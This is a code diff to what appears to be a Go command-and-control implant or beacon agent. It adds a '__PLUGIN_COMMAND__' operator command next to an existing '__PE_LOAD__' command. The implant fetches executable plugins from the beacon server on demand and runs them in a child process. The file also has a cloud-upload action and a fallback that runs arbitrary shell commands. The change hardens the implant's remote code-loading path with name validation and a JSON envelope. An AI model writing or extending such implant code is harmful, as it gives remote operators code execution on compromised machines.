@@ -19,6 +19,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
@@ -68,6 +69,8 @@ var (
 	logMu                   sync.Mutex
 	logFile                 *os.File
 )
+
+var pluginCommandPattern = regexp.MustCompile(`^[A-Za-z][A-Za-z0-9._-]{0,127}$`)
 
 func main() {
 	if len(os.Args) > 1 && os.Args[1] == "--plugin-child" {
@@ -341,7 +344,7 @@ func execute(command string, cfg *config, client *http.Client) (string, string) 
 		}
 		return result, "cloud_upload"
 	}
-	if strings.HasPrefix(trimmed, "__PE_LOAD__") {
+	if strings.HasPrefix(trimmed, "__PE_LOAD__") || strings.HasPrefix(trimmed, "__PLUGIN_COMMAND__") {
 		result, err := loadPluginCommand(client, cfg, trimmed)
 		if err != nil {
 			return "Plugin failed: " + err.Error(), "output"
@@ -351,27 +354,60 @@ func execute(command string, cfg *config, client *http.Client) (string, string) 
 	return runCommand(trimmed)
 }
 
-// loadPluginCommand parses the __PE_LOAD__ operator command. The plugin is
-// fetched from the beacon server on demand and executed in a child process.
+// loadPluginCommand parses the generic plugin commands. The plugin is fetched
+// from the beacon server on demand and executed in a child process.
 func loadPluginCommand(client *http.Client, cfg *config, command string) (string, error) {
 	fields := strings.SplitN(strings.TrimSpace(command), " ", 4)
 	if len(fields) < 2 || fields[1] == "" {
-		return "", errors.New("__PE_LOAD__ requires a plugin name")
+		return "", errors.New("plugin command requires a plugin name")
 	}
 	pluginToken := fields[1]
 	exportName := "Run"
-	if len(fields) > 2 && fields[2] != "" {
-		exportName = fields[2]
-	}
 	input := ""
-	if len(fields) > 3 {
-		input = fields[3]
+	if fields[0] == "__PLUGIN_COMMAND__" {
+		if len(fields) < 3 || fields[2] == "" {
+			return "", errors.New("__PLUGIN_COMMAND__ requires a command name")
+		}
+		if !pluginCommandPattern.MatchString(fields[2]) {
+			return "", errors.New("invalid plugin command name")
+		}
+		if len(fields) > 3 {
+			input = fields[3]
+		}
+		var err error
+		input, err = pluginCommandEnvelope(fields[2], input)
+		if err != nil {
+			return "", err
+		}
+	} else {
+		if len(fields) > 2 && fields[2] != "" {
+			exportName = fields[2]
+		}
+		if len(fields) > 3 {
+			input = fields[3]
+		}
 	}
 	url := pluginToken
 	if !strings.HasPrefix(pluginToken, "/") {
 		url = "/tools/plugins/" + pluginToken
 	}
 	return loadPluginPE(client, cfg, url, exportName, input)
+}
+
+// pluginCommandEnvelope keeps command names out of the agent command parser.
+// The plugin's Run export receives this JSON and owns subcommand dispatch.
+func pluginCommandEnvelope(command, input string) (string, error) {
+	payload, err := json.Marshal(map[string]string{
+		"command": command,
+		"input":   input,
+	})
+	if err != nil {
+		return "", fmt.Errorf("encode plugin command: %w", err)
+	}
+	if len(payload) > 4096 {
+		return "", errors.New("plugin command input is too large")
+	}
+	return string(payload), nil
 }
 
 func runCommand(command string) (string, string) {
